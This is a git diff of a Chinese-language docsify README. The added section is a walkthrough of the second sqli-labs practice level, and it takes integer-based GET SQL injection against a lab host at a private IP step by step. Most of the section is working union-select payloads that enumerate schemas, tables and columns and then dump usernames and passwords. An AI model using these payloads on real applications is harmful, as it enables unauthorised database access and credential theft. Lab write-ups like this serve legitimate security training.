@@ -9,7 +9,7 @@
 [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?url=https%3A%2F%2Fgithub.com%2Fjhildenbiddle%2Fdocsify-themeable&hashtags=css,docsify,developers,frontend)
 <a class="github-button" href="https://github.com/jhildenbiddle/docsify-themeable" data-icon="octicon-star" data-show-count="true" aria-label="Star jhildenbiddle/docsify-themeable on GitHub">Star</a>
 
-## 第一关-GET – 基于错误 – 单引号 – 字符型
+## <font color = #1E90FF>第一关-GET – 基于错误 – 单引号 – 字符型</font>
     可以在代码里sql语句下添加输出语句，更方便查看sql语句的效果
       
       $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
@@ -65,7 +65,7 @@ http://192.168.2.135/sqli/Less-1/?id=-1' union select 1,
     
 </figure>
 
-**65.还可以获取所有的数据库名**
+**6.还可以获取所有的数据库名**
 ```
 http://192.168.2.135/sqli/Less-1/?id=-1' union select 1,
 2,
@@ -119,6 +119,83 @@ http://192.168.2.135/sqli/Less-1/?id=-1' union select 1,2,
 
 ### 第一关结束！！！！
 
+## <font color = #1E90FF>第二关-GET – 整型</font>
+**可以在代码里sql语句下添加输出语句，更方便查看sql语句的效果**
+```
+ echo "your sql statement is ".$sql."<br>";  
+```
+
+**1.添加id=1正常，id=1' 报错，报错，发现报错信息只有单引号，说明是整型注入。**
+```
+http://192.168.2.135/sqli/Less-1/?id=1'
+```
+  <figure class="thumbnails">
+    <img src="picture/Sqlibc/two/1.png"   >
+    
+</figure>
+
+**2. 猜解字段数，测试到4的时候报错，说明字段数是3。**
+```
+http://192.168.2.135/sqli/Less-1/?id=1 order by 3--+ 
+```
+
+**3.确定显位数字，发现2,3均可回显**
+```
+http://192.168.2.135/sqli/Less-1/?id=-1 union select 1,2,3 --+
+```
+
+  <figure class="thumbnails">
+    <img src="picture/Sqlibc/two/2.png"   >
+    
+</figure>
+
+**3.获取当前数据库名，报错注入，数据库名为：security**
+```
+http://192.168.2.135/sqli/Less-1/?id=-1 union select 1,
+(select database()) ,
+3 --+
+```
+
+  <figure class="thumbnails">
+     <img src="picture/Sqlibc/two/3.png"   >
+    
+</figure>
+
+**4.还可以获取所有的数据库名**
+```
+http://192.168.2.135/sqli/Less-1/?id=-1 union select 1,
+2,
+(select group_concat(schema_name) from information_schema.schemata)--+
+```
+
+
+**5.获取当前数据库security的表名**
+```
+http://192.168.2.135/sqli/Less-1/?id=-1 union select 1,
+2,
+(select group_concat(table_name) from information_schema.tables where table_schema =0x7365637572697479)--+  
+
+(security的hex编码是7365637572697479)
+```
+
+**6.获取表的列名**
+```
+http://192.168.2.135/sqli/Less-1/?id=-1 union select 1,
+2,
+(select group_concat(column_name) from information_schema.columns where table_schema =0x7365637572697479 and table_name=0x7573657273)--+
+```
+
+
+**7.获取字段数据**
+```
+http://192.168.2.135/sqli/Less-1/?id=-1 union select 1,2,
+(select group_concat(id,0x7c,username,0x7c,password) from security.users) --+
+```
+
+
+**8.其他语句等等**
+
+### 第二关结束！！！！
 
 
 
